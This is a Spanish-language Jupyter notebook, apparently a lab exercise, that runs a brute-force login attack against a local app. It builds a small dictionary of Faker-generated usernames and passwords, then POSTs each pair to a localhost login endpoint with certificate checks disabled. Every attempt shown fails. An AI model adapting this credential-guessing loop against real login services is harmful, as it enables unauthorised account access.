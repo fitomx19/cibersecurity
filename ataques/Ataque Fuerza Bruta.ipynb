{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ataque Fuerza Bruta a App Ciberseguridad"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#pip install requests\n",
    "#pip install faker\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Kyle Howe\n",
      "*6Wbmq8#0!\n",
      "Nathan Shelton\n",
      "(q1JsyE788\n",
      "Lisa Garrison\n",
      "8@cIKyZv@y\n",
      "Brenda Reyes\n",
      "v2XuoK0j&S\n",
      "Amy King\n",
      "M*dr8I9ct2\n",
      "Patricia Davis\n",
      "Y0THou(R#W\n",
      "William Wright\n",
      "A&6sIrgkBx\n",
      "Lori Collins\n",
      "E#6SxKMjtf\n",
      "Felicia Wheeler\n",
      "s#71DzTY4#\n",
      "Mark Mcneil\n",
      "Jh5D2Hvc##\n"
     ]
    }
   ],
   "source": [
    "# con faker generar 10 usuarios y 10 contraseñas\n",
    "nombres = []\n",
    "contrasenas = []\n",
    "from faker import Faker\n",
    "fake = Faker()\n",
    "for i in range(10):\n",
    "    print(fake.name())\n",
    "    nombres.append(fake.name())\n",
    "    print(fake.password())\n",
    "    contrasenas.append(fake.password())\n",
    "\n",
    "nombres.append('juan')\n",
    "contrasenas.append('123')\n",
    "\n",
    "#crear un diccionario con los usuarios y contraseñas\n",
    "diccionario = dict(zip(nombres, contrasenas))\n",
    "\n",
    "#crear un json con el diccionario\n",
    "import json\n",
    "with open('diccionarios.json', 'w') as file:\n",
    "    json.dump(diccionario, file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Evan Rogers': '9qhMTlzx#B',\n",
       " 'Jamie Wilson': '%3SB6EoyM#',\n",
       " 'Michael Chan': 'P#$3hcBzu4',\n",
       " 'Ruth White': 'PUJ69O^oH$',\n",
       " 'Brian Sanchez': 'Gjut9NHe*)',\n",
       " 'Joshua Anthony': '8HU!rRl9_i',\n",
       " 'Laura Pugh': '*6ZiJe7SBm',\n",
       " 'Joshua Wiggins': 'O8xbeP2o^(',\n",
       " 'Amber Miller DVM': '+$Hv4%Mo#4',\n",
       " 'Nicole Andrews': 'i$6AGkzh0a',\n",
       " 'juan': '123'}"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#leer diccionarios.json\n",
    "with open('diccionarios.json', 'r') as file:\n",
    "    diccionario = json.load(file)\n",
    "#crear un diccionario con los usuarios y contraseñas\n",
    "diccionario"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "peticion para el usuario:  Evan Rogers\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Jamie Wilson\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Michael Chan\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Ruth White\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Brian Sanchez\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Joshua Anthony\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Laura Pugh\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Joshua Wiggins\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Amber Miller DVM\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  Nicole Andrews\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n",
      "peticion para el usuario:  juan\n",
      "b'{\"mensaje\":\"Correo/Contrase\\xc3\\xb1a Erroneos ->\"}'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n",
      "/opt/homebrew/lib/python3.10/site-packages/urllib3/connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n"
     ]
    }
   ],
   "source": [
    "#mandar una peticion post a la url http://localhost:4000/iniciar-sesion con el siguiente json {\"perfil\":\"juan\",\"password\":\"123\"}\n",
    "\n",
    "import requests\n",
    "import json\n",
    "\n",
    "url = \"https://localhost:4000/iniciar-sesion\"\n",
    "#payload = {\"perfil\":\"12345@gmail.com\",\"password\":\"123gato\"}\n",
    "headers = {'Content-Type': 'application/json'}\n",
    "\n",
    "for x in diccionario:\n",
    "    payload = {\"perfil\":x,\"password\":diccionario[x]}\n",
    "    response = requests.request(\"POST\", url, headers=headers, verify=False, data = json.dumps(payload))\n",
    "    print(\"peticion para el usuario: \",x)\n",
    "    print(response.text.encode('utf8'))\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.10"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "5c7b89af1651d0b8571dde13640ecdccf7d5a6204171d6ab33e7c296e100e08a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
